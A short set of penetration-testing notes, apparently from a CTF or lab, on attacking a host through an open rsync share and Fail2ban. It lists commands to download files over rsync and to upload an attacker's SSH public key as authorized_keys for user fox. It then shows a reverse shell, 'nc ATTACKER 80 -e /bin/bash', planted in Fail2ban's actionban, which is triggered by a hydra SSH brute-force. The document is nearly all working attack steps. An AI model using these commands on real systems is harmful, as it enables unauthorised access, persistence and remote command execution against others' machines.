
# rsync

To list the directory ->
```
rsync -av --list-only rsync://$IP/fox
```

To grab all files in the directory -> 
```
rsync -av rsync://$IP:873/fox ./rsyn_shared
```

generate the public key and private key ->
```
ssh-keygen
```

copy the public key out off roots directory and place it in the /tmp/.ssh directory ->
```
pwd = /tmp/.ssh

cp /root/.ssh/id_rsa.pub .
```
rename it to "authorized_keys" ->
```
mv id_rsa.pub authorized_keys
```

Upload directory to Fox home directory ->
```
rsync -av /tmp/.ssh/ rsync://fox@$IP/fox/.ssh
```

ssh in ->
```
ssh fox@$IP
```

# Fail2ban 

To modify the action ban variable ->
```
nano /etc/fail2ban/action.d/iptables-multiport.conf
```

place reverse shell there ->\
```
actionban = nc ATTACKER 80 -e /bin/bash
```

To trigger the ban we have to send a lot of requests using hydra ->
```
hydra -l lol -P /usr/share/wordlists/rockyou.txt $IP ssh
```

